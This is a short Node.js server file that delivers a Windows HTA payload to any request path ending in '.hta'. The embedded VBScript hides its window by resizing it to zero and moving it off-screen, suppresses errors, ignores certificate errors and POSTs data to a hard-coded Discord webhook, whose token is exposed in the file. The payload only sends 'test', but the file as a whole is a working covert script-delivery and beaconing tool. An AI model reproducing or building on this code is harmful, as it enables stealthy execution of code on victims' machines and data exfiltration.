const http = require('http');
const PORT = process.env.PORT || 8080;

const hta = '<html><head><title>.</title><hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/><script language="VBScript">window.resizeTo 0,0:window.moveTo -2000,-2000:On Error Resume Next:Dim h:Set h=CreateObject("MSXML2.ServerXMLHTTP.6.0"):h.SetOption 2,13056:h.Open "POST","https://discord.com/api/webhooks/1537058264217288857/_gDfWmViEwuCjdpTpeXyHfNdSfOp0pPcbrUQ4Rkb9WdpwUU7ssK0Eeo1hkeUyk5k_bhW",False:h.SetRequestHeader "Content-Type","application/json":h.Send "{""content"":""test""}":window.close()</script></head><body></body></html>';

const server = http.createServer((req, res) => {
    if (req.url.endsWith('.hta')) {
        res.writeHead(200, {'Content-Type': 'application/hta'});
        res.end(hta);
    } else {
        res.writeHead(200, {'Content-Type': 'text/html'});
        res.end('OK');
    }
});

server.listen(PORT, () => console.log('Listening on ' + PORT));
